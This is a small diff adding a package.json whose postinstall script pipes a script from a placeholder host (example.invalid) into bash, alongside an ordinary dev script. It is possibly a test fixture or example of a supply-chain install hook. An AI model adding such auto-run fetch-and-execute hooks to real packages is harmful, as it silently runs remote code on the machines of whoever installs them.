@@ -1,0 +1,7 @@
+{
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash",
+    "dev": "node server.js"
+  }
+}
+
